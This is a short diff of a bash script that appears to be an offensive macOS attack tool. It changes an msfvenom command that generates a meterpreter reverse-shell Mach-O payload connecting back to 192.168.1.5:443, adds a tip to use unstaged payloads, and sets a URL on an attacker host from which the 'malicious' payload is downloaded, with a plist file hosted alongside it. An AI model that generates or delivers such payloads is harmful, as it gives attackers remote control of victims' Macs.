@@ -1,7 +1,7 @@
 #!/usr/bin/env bash
 
-# URL hosting our malicious mach-o reverse shell generated with msfvenom
-# msfvenom -p osx/x64/meterpreter/reverse_tcp LHOST=192.168.1.5 LPORT=443 -f macho > osx
+# URL hosting our malicious mach-o reverse shell generated with msfvenom (USE UNSTAGED PAYLOADS WHEN GENERATING MACHO)
+# msfvenom -p osx/x64/meterpreter_reverse_tcp LHOST=192.168.1.5 LPORT=443 -f macho > osx
 URL="https://192.168.1.5:8443/osx"
 
 # URL hosting our plist file
